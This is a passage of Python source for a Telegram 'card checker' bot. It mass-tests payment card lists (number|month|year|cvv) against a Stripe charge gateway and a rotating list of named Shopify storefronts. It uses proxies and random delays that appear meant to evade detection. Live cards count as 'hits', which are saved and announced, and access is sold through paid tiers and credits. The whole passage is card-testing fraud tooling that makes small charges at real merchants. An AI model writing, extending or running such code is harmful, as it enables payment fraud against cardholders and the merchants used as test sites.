                stats["charged"] + stats["approved"],
                stats["declined"],
                f"Batch {batch_number}/{total_batches}",
                f"Processing {len(batch_cards)} cards..."
            )
            
            # Process cards in this batch concurrently
            batch_tasks = []
            for card in batch_cards:
                task = asyncio.create_task(
                    process_single_new_stripe_card(
                        card, u_id, tier, speed_controller, context, message, stats, results_lock, hits_sent
                    )
                )
                batch_tasks.append(task)
            
            # Wait for all cards in this batch to complete
            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
            
            # Update processed count and hits_sent
            for result in batch_results:
                if isinstance(result, dict):
                    if result.get('sent'):
                        hits_sent += 1
                    processed += 1
            
            # Update progress after batch
            await update_progress_buttons(
                context, message.chat_id, progress_msg.message_id,
                processed, total,
                stats["charged"] + stats["approved"],
                stats["declined"],
                f"Batch {batch_number} complete",
                f"Processed {processed}/{total} cards..."
            )
            
            # Add random delay between batches (2-4 seconds)
            if batch_end < total:
                batch_delay = random.uniform(2.0, 4.0)
                print(f"⏱️ Waiting {batch_delay:.1f}s before next batch...")
                await asyncio.sleep(batch_delay)
        
        # Final summary
        if u_id in stripe_charge_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            cards_per_minute = (total / (total_time / 60)) if total_time > 0 else 0
            
            summary = (
                f"🏁 <b>File Processing Complete - New Stripe API</b>\n\n"
                f"🔥 Charged/Hits: {stats['charged']}\n"
                f"✅ Approved (CVV/3D): {stats['approved']}\n"
                f"❌ Declined: {stats['declined']}\n"
                f"⚠️ Errors: {stats['errors']}\n"
                f"📝 Total: {stats['total']}\n"
            )
            
            await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        print(f"❌ New Stripe file mass check error: {e}")
        traceback.print_exc()
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
            else:
                await message.reply_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        stripe_charge_active_tasks.pop(u_id, None)
        
async def process_single_new_stripe_card(card: str, u_id: int, tier: str, speed_controller, 
                                          context, message, stats: dict, results_lock: asyncio.Lock, hits_sent: int):
    """Process a single card for New Stripe API with random delay"""
    
    try:
        # Add random delay before processing (1-2 seconds)
        delay = random.uniform(1.0, 2.0)
        await asyncio.sleep(delay)
        
        # Apply speed control
        await speed_controller.wait_if_needed()
        
        start = time.time()
        proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
        result = await check_card_new_stripe(card, proxy_str)
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        # Get BIN info
        bin_info = await get_bin_info(card)
        ui, status_category = format_new_stripe_response(result, card, bin_info)
        response_msg = result.get("message", "")
        
        # Check for hits
        is_hit, hit_type = is_hit_response(response_msg)
        
        sent = False
        
        # Update stats and send result if approved/charged
        if status_category == "charged" or is_hit:
            async with results_lock:
                stats["charged"] += 1
                stats["approved"] += 1
            
            # Send result immediately
            await message.reply_text(ui, parse_mode=ParseMode.HTML)
            
            await save_hit_to_file(
                card=card,
                gateway="New Stripe API",
                response=response_msg,
                price=result.get("price", "$0.50"),
                bin_info=bin_info,
                user_id=u_id,
                user_tier=tier
            )
            
            user_data = user_manager.get_user(u_id)
            await send_hit_notification(
                context=context,
                gateway="New Stripe API",
                card=card,
                response=response_msg,
                price=result.get("price", "$0.50"),
                user=user_data,
                bin_info=bin_info,
                status_category="charged"
            )
            sent = True
            user_manager.increment_hits(u_id)
            
        elif status_category == "approved":
            async with results_lock:
                stats["approved"] += 1
            
            # Send result for approved (CVV live/Insufficient)
            await message.reply_text(ui, parse_mode=ParseMode.HTML)
            
            await save_hit_to_file(
                card=card,
                gateway="New Stripe API",
                response=response_msg,
                price=result.get("price", "$0.50"),
                bin_info=bin_info,
                user_id=u_id,
                user_tier=tier
            )
            sent = True
            user_manager.increment_hits(u_id)
            
        elif status_category == "declined":
            async with results_lock:
                stats["declined"] += 1
            print(f"🔇 Declined (silent): {card[:20]}...")
            
        else:
            async with results_lock:
                stats["errors"] += 1
            print(f"⚠️ Error (silent): {card[:20]}...")
        
        user_manager.increment_checks(u_id, 1)
        
        return {'sent': sent, 'card': card, 'status': status_category}
        
    except Exception as e:
        print(f"❌ Error processing card {card[:20]}: {e}")
        async with results_lock:
            stats["errors"] += 1
        return {'sent': False, 'card': card, 'error': str(e)}


# ============ NEW STRIPE FILE COMMAND HANDLER ============

async def new_stripe_file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file upload for New Stripe API - /nstripem file"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    # Check user access
    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
        await message.reply_text("❌ Your tier doesn't have access to Stripe Charge gateway.")
        return
    
    # Check if user can mass check
    if not user_manager.can_mass_check(user_id):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ <b>Mass Check Not Available for {tier.upper()} Tier</b>\n\n"
            f"Your tier ({tier.upper()}) only supports single card checks.\n\n"
            f"Use <code>/nstripe &lt;card&gt;</code> for single checks.\n\n"
            f"💎 Upgrade to Premium/Ultimate for mass file checks.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if this is a reply to a file
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply_text(
            "📁 <b>New Stripe API - File Mass Check</b>\n\n"
            "Please reply to a .txt file with this command:\n\n"
            "<code>/nstripem</code> (reply to a file)\n\n"
            "File format (one card per line):\n"
            "<code>card_number|month|year|cvv</code>\n"
            "Example: <code>4242424242424242|12|2028|123</code>\n\n"
            "Or use: <code>/nstripem &lt;card1&gt; &lt;card2&gt; ...</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get the file
    file = await message.reply_to_message.document.get_file()
    content = await file.download_as_bytearray()
    content = content.decode('utf-8', errors='ignore')
    
    # Extract cards from file
    cards = []
    invalid_cards = []
    
    for line in content.splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            card = card_formatter.extract_single_card_from_text(line)
            if card:
                cards.append(card)
            else:
                invalid_cards.append(line[:30])
    
    if invalid_cards:
        await message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0]}..."
        )
    
    if not cards:
        await message.reply_text("❌ No valid cards found in the file.")
        return
    
    # Check batch size limit
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    # Start mass check
    await new_stripe_mass_check_from_file(update, context, cards)
        
# ============ CREDIT SYSTEM (FREE USERS ONLY) ============
CREDITS_FILE = "user_credits.json"
INITIAL_FREE_CREDITS = 250
CREDITS_PER_CHECK = 1  # 1 credit = 1 card check (only for free users)

# Store user credits
user_credits = {}  # user_id -> credits remaining
user_credits_loaded = False

def load_user_credits():
    """Load user credits from file"""
    global user_credits, user_credits_loaded
    if Path(CREDITS_FILE).exists():
        try:
            with open(CREDITS_FILE, 'r') as f:
                user_credits = json.load(f)
                # Convert string keys to int
                user_credits = {int(k): v for k, v in user_credits.items()}
            print(f"📊 Loaded credits for {len(user_credits)} users")
        except Exception as e:
            print(f"⚠️ Error loading credits: {e}")
            user_credits = {}
    else:
        user_credits = {}
    user_credits_loaded = True

def save_user_credits():
    """Save user credits to file"""
    try:
        with open(CREDITS_FILE, 'w') as f:
            json.dump(user_credits, f, indent=2)
    except Exception as e:
        print(f"⚠️ Error saving credits: {e}")

def get_user_credits(user_id: int) -> int:
    """Get remaining credits for a user"""
    if not user_credits_loaded:
        load_user_credits()
    return user_credits.get(user_id, 0)

def add_user_credits(user_id: int, amount: int) -> int:
    """Add credits to a user and return new total"""
    current = get_user_credits(user_id)
    new_total = current + amount
    user_credits[user_id] = new_total
    save_user_credits()
    return new_total

def deduct_user_credits(user_id: int, amount: int = CREDITS_PER_CHECK) -> bool:
    """Deduct credits for a check, return True if successful"""
    current = get_user_credits(user_id)
    if current >= amount:
        user_credits[user_id] = current - amount
        save_user_credits()
        return True
    return False

def initialize_new_user_credits(user_id: int) -> int:
    """Give initial free credits to new user (only for free tier)"""
    # Only give credits if user doesn't have any credits yet
    if user_id not in user_credits:
        user_credits[user_id] = INITIAL_FREE_CREDITS
        save_user_credits()
        print(f"🎉 New free user {user_id} received {INITIAL_FREE_CREDITS} free credits!")
        return INITIAL_FREE_CREDITS
    return user_credits[user_id]

def reset_user_credits(user_id: int) -> bool:
    """Reset user credits to initial amount (admin only)"""
    user_credits[user_id] = INITIAL_FREE_CREDITS
    save_user_credits()
    return True

# Load credits on startup
load_user_credits()


# ============ ENHANCED AUTOSOPI SITES MANAGEMENT ============
class SiteTestPool:
    """Connection pool for site testing to reuse connections"""
    
    def __init__(self, max_connections=20):
        self.max_connections = max_connections
        self.clients = {}
        self.semaphore = asyncio.Semaphore(max_connections)
        self._lock = asyncio.Lock()
        
    async def get_client(self, site_hash):
        """Get or create HTTP client for testing"""
        async with self._lock:
            if site_hash not in self.clients:
                limits = httpx.Limits(
                    max_keepalive_connections=10,
                    max_connections=self.max_connections,
                    keepalive_expiry=60
                )
                self.clients[site_hash] = httpx.AsyncClient(
                    timeout=httpx.Timeout(10.0, connect=5.0, read=8.0),
                    limits=limits,
                    follow_redirects=True,
                    http2=True,
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                )
            return self.clients[site_hash]
    
    async def test_site(self, site: str) -> Tuple[bool, str, float]:
        """Test a single site with connection pooling"""
        start = time.time()
        site_hash = hashlib.md5(site.encode()).hexdigest()[:8]
        
        async with self.semaphore:
            try:
                client = await self.get_client(site_hash)
                
                if not site.startswith(('http://', 'https://')):
                    test_url = f"https://{site}"
                else:
                    test_url = site
                
                try:
                    response = await client.head(test_url, timeout=5.0, follow_redirects=True)
                    if response.status_code < 400:
                        elapsed = time.time() - start
                        return True, "Site accessible", elapsed
                except:
                    pass
                
                response = await client.get(test_url, timeout=8.0, follow_redirects=True)
                elapsed = time.time() - start
                
                if response.status_code == 200:
                    return True, "OK", elapsed
                else:
                    return False, f"HTTP {response.status_code}", elapsed
                    
            except httpx.TimeoutException:
                elapsed = time.time() - start
                return False, "Timeout", elapsed
            except httpx.ConnectError:
                elapsed = time.time() - start
                return False, "Connection failed", elapsed
            except Exception as e:
                elapsed = time.time() - start
                return False, str(e)[:30], elapsed
    
    async def close_all(self):
        """Close all connections"""
        async with self._lock:
            for client in self.clients.values():
                try:
                    await client.aclose()
                except:
                    pass
            self.clients.clear()


class SiteTestCache:
    """Cache site test results to avoid repeated testing"""
    
    def __init__(self, cache_ttl=300):
        self.cache = {}
        self.cache_ttl = cache_ttl
        self.hits = 0
        self.misses = 0
        self._lock = asyncio.Lock()
        
    async def get_or_test(self, site: str, test_func) -> Tuple[bool, str]:
        """Get cached result or test site"""
        now = time.time()
        
        async with self._lock:
            if site in self.cache:
                result, timestamp = self.cache[site]
                if now - timestamp < self.cache_ttl:
                    self.hits += 1
                    return result
        
        self.misses += 1
        result = await test_func(site)
        
        async with self._lock:
            self.cache[site] = (result, now)
            
            if self.misses % 50 == 0:
                await self._clean_cache()
        
        return result
    
    async def _clean_cache(self):
        """Remove expired cache entries"""
        now = time.time()
        expired = [
            site for site, (_, ts) in self.cache.items() 
            if now - ts > self.cache_ttl
        ]
        for site in expired:
            del self.cache[site]
    
    def get_stats(self):
        """Get cache statistics"""
        total = self.hits + self.misses
        hit_rate = (self.hits / total * 100) if total > 0 else 0
        return {
            "hits": self.hits,
            "misses": self.misses,
            "hit_rate": hit_rate,
            "cache_size": len(self.cache)
        }


class AutosopiSiteManager:
    """Enhanced site manager with rotation, dead site removal, and weighted selection"""
    
    def __init__(self, data_file=AUTOSOPI_SITES_FILE, pending_file=AUTOSOPI_PENDING_SITES_FILE):
        self.data_file = data_file
        self.pending_file = pending_file
        self.sites = []
        self.pending_sites = []
        self.current_index = 0
        self.site_stats = {}
        self.site_failures = {}
        self.sites_to_remove = set()  # ← ADD THIS LINE - FIXES THE ERROR
        self.test_pool = SiteTestPool(max_connections=20)
        self.test_cache = SiteTestCache(cache_ttl=300)
        self._load_lock = asyncio.Lock()
        self._save_lock = asyncio.Lock()
        self.load_sites()
        self.load_pending_sites()
        
        # Auto-save backup every hour
        self._start_auto_backup()
    
    def _start_auto_backup(self):
        """Start automatic backup thread"""
        def backup_worker():
            while True:
                time.sleep(3600)  # Every hour
                try:
                    self.save_sites()
                    backup_file = f"autosopi_sites_backup_{int(time.time())}.json"
                    with open(self.data_file, 'r') as f:
                        data = json.load(f)
                    with open(backup_file, 'w') as f:
                        json.dump(data, f, indent=2)
                    print(f"💾 Auto-backup created: {backup_file}")
                    
                    backup_files = sorted(Path('.').glob('autosopi_sites_backup_*.json'))
                    for old_file in backup_files[:-5]:
                        old_file.unlink()
                except Exception as e:
                    print(f"⚠️ Auto-backup error: {e}")
        
        import threading
        thread = threading.Thread(target=backup_worker, daemon=True)
        thread.start()
    
    def load_sites(self):
        """Load sites from JSON file with error recovery"""
        try:
            if Path(self.data_file).exists():
                with open(self.data_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if isinstance(data, list):
                        self.sites = data
                        self.site_stats = {}
                        self.site_failures = {}
                        print(f"📦 Loaded {len(self.sites)} Autosopi sites (list format)")
                    else:
                        self.sites = data.get('sites', [])
                        self.site_stats = data.get('stats', {})
                        self.site_failures = data.get('failures', {})
                        print(f"📦 Loaded {len(self.sites)} Autosopi sites (dict format)")
            else:
                print("⚠️ No sites file found, using defaults")
                self._load_default_sites()
        except Exception as e:
            print(f"⚠️ Error loading sites: {e}")
            print("🔄 Attempting to recover from backup...")
            self._recover_from_backup()
    
    def _load_default_sites(self):
        """Load default sites"""
        self.sites = [
            "bradshawblanks.com",
            "bluemoonemporium.com",
            "rachelshafer.com",
            "fullaccessutv.com",
            "lilmonkeyboutique.com",
            "savelacougars.myshopify.com",
            "elite-deal-seekers.myshopify.com",
            "empire-theme-industrial.myshopify.com",
            "1-cent-store.myshopify.com"
        ]
        self.site_stats = {}
        self.site_failures = {}
        self.sites_to_remove = set()  # ← ADD THIS HERE TOO
        self.save_sites()
        print(f"✅ Loaded {len(self.sites)} default sites")
    
    def _recover_from_backup(self):
        """Recover from the most recent backup file"""
        try:
            backup_files = list(Path('.').glob('autosopi_sites_backup_*.json'))
            if backup_files:
                latest_backup = max(backup_files, key=lambda p: p.stat().st_mtime)
                with open(latest_backup, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    
                if isinstance(data, list):
                    self.sites = data
                    self.site_stats = {}
                    self.site_failures = {}
                else:
                    self.sites = data.get('sites', [])
                    self.site_stats = data.get('stats', {})
                    self.site_failures = data.get('failures', {})
                
                self.sites_to_remove = set()  # ← ADD THIS HERE TOO
                print(f"✅ Recovered {len(self.sites)} sites from backup: {latest_backup}")
                self.save_sites()
            else:
                print("⚠️ No backup files found, using defaults")
                self._load_default_sites()
        except Exception as e:
            print(f"❌ Recovery failed: {e}")
            self._load_default_sites()
    
    def save_sites(self):
        """Save sites and stats to JSON file"""
        try:
            data = {
                'sites': self.sites,
                'stats': self.site_stats,
                'failures': self.site_failures
            }
            with open(self.data_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2)
            print(f"💾 Saved {len(self.sites)} sites to {self.data_file}")
        except Exception as e:
            print(f"⚠️ Error saving sites: {e}")
    
    def load_pending_sites(self):
        """Load pending site submissions"""
        if Path(self.pending_file).exists():
            try:
                with open(self.pending_file, 'r', encoding='utf-8') as f:
                    self.pending_sites = json.load(f)
                print(f"📦 Loaded {len(self.pending_sites)} pending Autosopi sites")
            except Exception as e:
                print(f"⚠️ Error loading pending sites: {e}")
                self.pending_sites = []
        else:
            self.pending_sites = []
    
    def save_pending_sites(self):
        """Save pending site submissions"""
        try:
            with open(self.pending_file, 'w', encoding='utf-8') as f:
                json.dump(self.pending_sites, f, indent=2)
        except Exception as e:
            print(f"⚠️ Error saving pending sites: {e}")
    
    def normalize_site_url(self, site: str) -> str:
        """Normalize site URL to always use proper format"""
        site = site.strip().lower()
        
        if site.endswith('/'):
            site = site[:-1]
        
        if site.startswith('http://'):
            site = site[7:]
        elif site.startswith('https://'):
            site = site[8:]
        
        if site.startswith('www.'):
            site = site[4:]
        
        return site
    
    def get_full_url(self, site: str) -> str:
        """Get full URL for testing/checking"""
        normalized = self.normalize_site_url(site)
        
        if '.myshopify.com' in normalized:
            return f"https://{normalized}"
        
        return f"https://{normalized}"
    
    def get_next_site(self):
        """Get next site in rotation - only skip sites marked for removal"""
        if not self.sites:
            return None
        
        # Only filter out sites that have been marked for removal
        available_sites = []
        for site in self.sites:
            # Check if site is marked for removal
            if site not in self.sites_to_remove:
                available_sites.append(site)
        
        # If all sites are marked for removal, reset
        if not available_sites:
            print("⚠️ All sites marked for removal! Resetting...")
            self.sites_to_remove = set()
            available_sites = self.sites.copy()
        
        # Round-robin selection
        if self.current_index >= len(available_sites):
            self.current_index = 0
        
        if not available_sites:
            return None
        
        site = available_sites[self.current_index]
        self.current_index = (self.current_index + 1) % len(available_sites)
        return site
    
    def get_next_site_weighted(self) -> str:
        """Get next site with weighted selection based on performance"""
        if not self.sites:
            return None
        
        # Filter out sites marked for removal
        available_sites = []
        for site in self.sites:
            if site not in self.sites_to_remove:
                available_sites.append(site)
        
        if not available_sites:
            print("⚠️ All sites marked for removal! Resetting...")
            self.sites_to_remove = set()
            available_sites = self.sites.copy()
        
        if not available_sites:
            return None
        
        # Get scores from tracker for all available sites
        sites_with_scores = []
        total_score = 0
        min_score = 5
        
        for site in available_sites:
            score = site_proxy_tracker.get_site_score(site) if hasattr(site_proxy_tracker, 'get_site_score') else 0
            
            if score > 0:
                sites_with_scores.append((site, score))
                total_score += score
            else:
                sites_with_scores.append((site, min_score))
                total_score += min_score
        
        # Weighted random selection
        r = random.uniform(0, total_score)
        cumulative = 0
        for site, score in sites_with_scores:
            cumulative += score
            if r <= cumulative:
                return site
        
        return available_sites[0]
    
    def reset_rotation(self):
        """Reset rotation index"""
        self.current_index = 0
    
    def add_site(self, site: str, user_id: int, user_name: str, bypass_pending: bool = False) -> Tuple[bool, str]:
        """Add a new site"""
        normalized_site = self.normalize_site_url(site)
        
        for existing_site in self.sites:
            if normalized_site == existing_site or site == existing_site:
                return False, "❌ Site already exists in rotation"
        
        for pending in self.pending_sites:
            if pending['site'] == normalized_site or pending['site'] == site:
                return False, "❌ Site already submitted and pending approval"
        
        if bypass_pending:
            self.sites.append(normalized_site)
            self.site_stats[normalized_site] = {
                'successes': 0,
                'failures': 0,
                'total': 0,
                'added_by': user_id,
                'added_at': time.time(),
                'added_by_name': user_name
            }
            self.save_sites()
            return True, f"✅ Site added directly to rotation: {normalized_site}"
        
        self.pending_sites.append({
            'site': normalized_site,
            'original_site': site,
            'user_id': user_id,
            'user_name': user_name,
            'submitted_at': time.time(),
            'status': 'pending'
        })
        self.save_pending_sites()
        return True, f"✅ Site submitted for review: {normalized_site}"
    
    def approve_site(self, site: str, admin_id: int) -> Tuple[bool, str]:
        """Approve a pending site (admin only)"""
        if admin_id != OWNER_ID:
            return False, "❌ Only owner can approve sites"
        
        for pending in self.pending_sites[:]:
            if (pending['site'] == site or 
                site in pending['site'] or 
                pending['original_site'] == site or
                pending['site'] in site):
                
                if pending['site'] not in self.sites:
                    self.sites.append(pending['site'])
                    self.site_stats[pending['site']] = {
                        'successes': 0,
                        'failures': 0,
                        'total': 0,
                        'added_by': pending['user_id'],
                        'added_at': time.time(),
                        'added_by_name': pending['user_name']
                    }
                
                self.pending_sites.remove(pending)
                self.save_sites()
                self.save_pending_sites()
                return True, f"✅ Site approved and added to rotation: {pending['site']}"
        
        return False, "❌ Site not found in pending list"
    
    def reject_site(self, site: str, admin_id: int, reason: str = "") -> Tuple[bool, str]:
        """Reject a pending site (admin only)"""
        if admin_id != OWNER_ID:
            return False, "❌ Only owner can reject sites"
        
        for pending in self.pending_sites[:]:
            if (pending['site'] == site or 
                site in pending['site'] or 
                pending['original_site'] == site):
                
                self.pending_sites.remove(pending)
                self.save_pending_sites()
                msg = f"❌ Site rejected: {pending['site']}"
                if reason:
                    msg += f"\nReason: {reason}"
                return True, msg
        
        return False, "❌ Site not found in pending list"
    
    def remove_site(self, site: str, user_id: int) -> Tuple[bool, str]:
        """Remove a site (admin only)"""
        if user_id != OWNER_ID:
            return False, "❌ Only owner can remove sites"
        
        site_to_remove = self.normalize_site_url(site)
        
        for existing_site in self.sites[:]:
            if site_to_remove == existing_site or site == existing_site:
                self.sites.remove(existing_site)
                if existing_site in self.site_stats:
                    del self.site_stats[existing_site]
                # Also remove from sites_to_remove if present
                if existing_site in self.sites_to_remove:
                    self.sites_to_remove.remove(existing_site)
                self.save_sites()
                return True, f"✅ Site removed: {existing_site}"
        
        return False, "❌ Site not found"
    
    def mark_site_result(self, site: str, is_success: bool, is_site_dead: bool = False, response_text: str = ""):
        """
        Track site performance - ONLY remove on SUBMIT REJECTED
        """
        normalized_site = self.normalize_site_url(site)
        
        # ============ ONLY REMOVE FOR SUBMIT REJECTED ============
        if "SUBMIT REJECTED" in response_text.upper():
            print(f"🗑️ SUBMIT REJECTED detected - Removing site immediately: {normalized_site}")
            self.sites_to_remove.add(normalized_site)
            # Actually remove from sites list
            if normalized_site in self.sites:
                self.sites.remove(normalized_site)
                if normalized_site in self.site_stats:
                    del self.site_stats[normalized_site]
                self.save_sites()
            return
        
        # ============ DO NOT REMOVE FOR ANY OTHER ERROR ============
        if not is_success and is_site_dead:
            print(f"⚠️ Site {normalized_site} had error: {response_text[:50]} - NOT removing (only SUBMIT REJECTED removes sites)")
            # Update stats but don't remove
            if normalized_site not in self.site_stats:
                self.site_stats[normalized_site] = {'errors': 0, 'total': 0, 'successes': 0}
            self.site_stats[normalized_site]['errors'] = self.site_stats[normalized_site].get('errors', 0) + 1
            self.site_stats[normalized_site]['total'] = self.site_stats[normalized_site].get('total', 0) + 1
            self.save_sites()
            return
        
        # Success case
        if is_success:
            if normalized_site not in self.site_stats:
                self.site_stats[normalized_site] = {'successes': 0, 'total': 0, 'errors': 0}
            
            self.site_stats[normalized_site]['successes'] = self.site_stats[normalized_site].get('successes', 0) + 1
            self.site_stats[normalized_site]['total'] = self.site_stats[normalized_site].get('total', 0) + 1
            self.save_sites()
    
    def list_sites(self) -> str:
        """Get formatted list of sites with stats"""
        if not self.sites:
            return "📋 No sites available"
        
        result = "📋 <b>Autosopi Sites:</b>\n\n"
        for i, site in enumerate(self.sites, 1):
            stats = self.site_stats.get(site, {})
            total = stats.get('total', 0)
            successes = stats.get('successes', 0)
            errors = stats.get('errors', 0)
            added_by = stats.get('added_by_name', 'Unknown')
            
            if total > 0:
                success_rate = (successes / total) * 100 if total > 0 else 0
                result += f"{i}. <code>{site}</code>\n"
                result += f"   📊 {success_rate:.1f}% ({successes}/{total}) | ✅ {successes} | ⚠️ {errors}\n"
                result += f"   👤 Added by: {added_by}\n"
            else:
                result += f"{i}. <code>{site}</code>\n"
                result += f"   👤 Added by: {added_by}\n"
        
        return result
    
    def list_pending_sites(self) -> str:
        """Get formatted list of pending sites"""
        if not self.pending_sites:
            return "⏳ No pending site submissions"
        
        result = "⏳ <b>Pending Site Submissions:</b>\n\n"
        for i, pending in enumerate(self.pending_sites, 1):
            submitted = datetime.fromtimestamp(pending['submitted_at']).strftime("%Y-%m-%d %H:%M")
            result += f"{i}. <code>{pending['site']}</code>\n"
            result += f"   👤 Submitted by: {pending['user_name']} (ID: {pending['user_id']})\n"
            result += f"   📅 {submitted}\n\n"
        
        return result
    
    async def test_site(self, site: str) -> Tuple[bool, str]:
        """Test if a site is working"""
        try:
            full_url = self.get_full_url(site)
            print(f"🧪 Testing URL: {full_url} (original: {site})")
            
            is_working, message, elapsed = await self.test_pool.test_site(full_url)
            
            if is_working:
                return True, f"✅ Site accessible ({elapsed:.2f}s)"
            else:
                return False, f"❌ {message} ({elapsed:.2f}s)"
                
        except Exception as e:
            return False, f"❌ Error: {str(e)[:50]}"
    
    async def close(self):
        """Clean up resources"""
        await self.test_pool.close_all()


# Create global instance
autosopi_site_manager = AutosopiSiteManager()

class AutosopiRetryManager:
    """Manage retries for Autosopi mass checks - SEPARATE retry from removal"""
    
    def __init__(self):
        self.retry_counts = {}  # card -> retry_count
        self.failed_sites = {}  # site -> fail_count (for logging only)
        self.sites_to_remove = set()  # Sites that need immediate removal (SUBMIT REJECTED only)
        self.retry_delays = [2, 5, 10]  # Exponential backoff: 2s, 5s, 10s
        
    def should_retry(self, card: str, error_message: str) -> Tuple[bool, int]:
        """
        Check if a card should be retried based on error
        Returns: (should_retry, delay_seconds)
        """
        error_upper = error_message.upper()
        
        # ============ RETRY ERRORS (try different site/proxy) ============
        retry_errors = [
            "SITE DEAD",           # Site is down, try another site
            "PROXY DEAD",          # Proxy failed, try another proxy  
            "CONNECTION ERROR",    # Network issue, retry
            "TIMEOUT",             # Timeout, retry
            "SERVER ERROR",        # Server error, retry
            "FAILED TO PERFORM",   # API error, retry
            "TOKENIZE_FAIL",       # Tokenization failed, retry
            "SUBMIT REJECTED",     # Also retry with different site
        ]
        
        # ============ NEVER RETRY THESE (card is dead) ============
        no_retry_errors = [
            "CARD_DECLINED",
            "Order completed",
            "Order completed 💎",
            "INSUFFICIENT FUNDS",
            "CVV MISMATCH",
            "EXPIRED CARD",
            "DO NOT HONOR",
            "INCORRECT CVV",
            "LOST CARD",
            "STOLEN CARD",
            "RESTRICTED CARD",
        ]
        
        # Check for no-retry errors first
        if any(err in error_upper for err in no_retry_errors):
            print(f"❌ Card error (no retry): {error_message[:50]}")
            return False, 0
        
        # Check for retryable errors
        if any(err in error_upper for err in retry_errors):
            retry_count = self.retry_counts.get(card, 0)
            max_retries = AUTOSOPI_RETRY_CONFIG.get("max_retries", 2)
            
            if retry_count < max_retries:
                self.retry_counts[card] = retry_count + 1
                delay = self.retry_delays[min(retry_count, len(self.retry_delays) - 1)]
                print(f"🔄 Card needs retry #{retry_count + 1}/{max_retries} - waiting {delay}s: {error_message[:50]}")
                return True, delay
            else:
                print(f"⚠️ Card exceeded max retries ({max_retries}): {error_message[:50]}")
                return False, 0
        
        return False, 0
    
    def mark_site_for_removal(self, site: str, error_message: str):
        """
        Mark a site for removal - ONLY for SUBMIT REJECTED
        All other errors are just logged but don't remove
        """
        error_upper = error_message.upper()
        
        # ONLY remove for SUBMIT REJECTED
        if "SUBMIT REJECTED" in error_upper:
            self.sites_to_remove.add(site)
            print(f"🗑️ Site marked for removal: {site} - SUBMIT REJECTED")
        # For all other errors, just log but don't remove
        else:
            self.failed_sites[site] = self.failed_sites.get(site, 0) + 1
            print(f"⚠️ Site {site} had error: {error_message[:50]} - NOT removing (only SUBMIT REJECTED removes sites)")
    
    def get_sites_to_remove(self) -> set:
        """Get set of sites that need immediate removal"""
        return self.sites_to_remove.copy()
    
    def clear_removed_sites(self):
        """Clear the sites to remove set after removal"""
        self.sites_to_remove.clear()
    
    def clear_card_retry(self, card: str):
        """Clear retry count for a card (after success or max retries)"""
        if card in self.retry_counts:
            del self.retry_counts[card]
    
    def get_retry_count(self, card: str) -> int:
        """Get current retry count for a card"""
        return self.retry_counts.get(card, 0)
    
    def reset(self):
        """Reset all tracking (for new session)"""
        self.retry_counts.clear()
        self.failed_sites.clear()
        self.sites_to_remove.clear()

# Create global instance
autosopi_retry_manager = AutosopiRetryManager()


async def send_hit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manually send a hit notification (admin only) - /sendhit"""
    
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    # Get the full message text and parse properly
    message_text = update.message.text
    if message_text.startswith('/sendhit'):
        message_text = message_text[8:].strip()
    elif message_text.startswith('/sendhit@'):
        message_text = message_text[message_text.find(' ') + 1:].strip()
    
    import shlex
    try:
        args = shlex.split(message_text)
    except:
        args = message_text.split()
    
    if len(args) < 6:
        await update.message.reply_text(
            "🎯 <b>Send Hit Notification Command</b>\n\n"
            "Usage: <code>/sendhit &lt;card&gt; &lt;gateway&gt; &lt;response&gt; &lt;price&gt; &lt;user_id&gt; &lt;tier&gt;</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        card = args[0]
        gateway = args[1]
        response = args[2]
        price = args[3]
        user_id = int(args[4])
        user_tier = args[5].lower()
        
        if '|' not in card:
            await update.message.reply_text("❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV")
            return
        
        valid_tiers = ["free", "premium", "ultimate", "admin"]
        if user_tier not in valid_tiers:
            await update.message.reply_text(f"❌ Invalid tier. Choose: {', '.join(valid_tiers)}")
            return
        
        username = ""
        first_name = "User"
        try:
            target_user = await context.bot.get_chat(user_id)
            username = target_user.username or ""
            first_name = target_user.first_name or "User"
        except Exception as e:
            print(f"⚠️ Could not fetch user info: {e}")
        
        bin_info = await get_bin_info(card)
        bin_info_text, bank, country, currency_code, country_code = bin_info
        
        response_upper = response.upper()
        
        if "CHARGED" in response_upper or "ORDER COMPLETED" in response_upper or "PAID" in response_upper:
            status_display = "🔥 CHARGED 🔥"
            status_category = "charged"
        elif "NEW PAYMENT METHOD ADDED" in response_upper:
            status_display = "✅ ADDED"
            status_category = "approved"
        elif "EXISTING_ACCOUNT_RESTRICTED" in response_upper:
            status_display = "🔐 CVV LIVE"
            status_category = "approved"
        elif "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
            status_display = "💰 INSUFFICIENT FUNDS"
            status_category = "approved"
        elif "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
